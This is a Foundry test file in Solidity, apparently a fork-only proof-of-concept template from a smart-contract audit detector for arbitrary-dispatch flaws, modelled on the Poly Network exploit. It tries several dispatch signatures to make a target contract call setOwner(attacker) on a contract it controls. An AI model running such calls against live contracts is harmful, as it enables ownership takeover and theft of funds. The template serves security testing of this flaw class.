// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Arbitrary dispatch on a caller-supplied target
/// @notice Detector: arbitrary-dispatch-call. The contract executes a target
///         address and calldata supplied by its caller, so the caller chooses
///         what the contract does — including selectors the protocol never
///         meant to expose, in the contract's own authority.
/// @dev FORK-ONLY. Reference incident: Poly Network (August 2021, $611M) —
///      verifyHeaderAndExecuteTx forwarded a user-supplied target and _method
///      to _executeCrossChainTx, the attacker brute-forced a 4-byte selector
///      matching putEpochConPubKeyBytes, and the manager's ownership of the
///      data contract did the rest. Beanstalk's proposal executor is the same
///      door from the governance side.
///      Copy to foundry/test/Exploit.t.sol and run via scripts/run-fork-poc.sh.
///      POC_PRIVILEGED is a contract the target has authority over; the
///      verdict is that contract's state or balance moving, never the
///      dispatcher returning.
contract PoC is Test {
    address public target;
    address public privileged;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        privileged = vm.envOr("POC_PRIVILEGED", address(0));
        require(target != address(0), "POC_TARGET not set (the dispatcher)");
        require(privileged != address(0), "POC_PRIVILEGED not set (a contract the dispatcher has authority over)");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "dispatcher has no code at this fork block");
        assertGt(privileged.code.length, 0, "privileged contract has no code at this fork block");
    }

    /// The payload the attacker wants the dispatcher to send. It targets a
    /// privileged selector on the contract the dispatcher is trusted by.
    function _payload(address attacker) internal pure returns (bytes memory) {
        return abi.encodeWithSignature("setOwner(address)", attacker);
    }

    function test_dispatchReachesPrivilegedSelector() public {
        address attacker = makeAddr("attacker");
        uint256 before = privileged.balance;
        bool reached = false;

        // Two candidate dispatch shapes: (address,bytes) and (address,string,bytes).
        string[2] memory shapes = ["dispatch(address,bytes)", "execute(address,bytes)"];
        for (uint256 i = 0; i < shapes.length && !reached; ++i) {
            vm.prank(attacker);
            (bool ok,) = target.call(abi.encodeWithSignature(shapes[i], privileged, _payload(attacker)));
            if (!ok) {
                // The Poly shape takes a method name as a string.
                vm.prank(attacker);
                (ok,) = target.call(
                    abi.encodeWithSignature("execute(address,string,bytes)", privileged, "setOwner(address)", _payload(attacker))
                );
            }
            console.log("dispatch shape", shapes[i], ok);
            reached = ok && (privileged.balance < before || _ownerIs(privileged, attacker));
        }

        console.log("privileged balance before/after:", before, privileged.balance);

        assertTrue(
            reached,
            "the dispatcher did not reach a privileged selector. Tried dispatch(address,bytes), execute(address,bytes) and execute(address,string,bytes) against the privileged contract. This does NOT establish safety: the entry may have another name or argument order, or the privileged selector may be different. Read the dispatcher's function table and set POC_PRIVILEGED to a contract it actually has authority over."
        );
    }

    function _ownerIs(address who, address expected) internal view returns (bool) {
        (bool ok, bytes memory ret) = who.staticcall(abi.encodeWithSignature("owner()"));
        if (!ok || ret.length < 32) return false;
        return abi.decode(ret, (address)) == expected;
    }
}
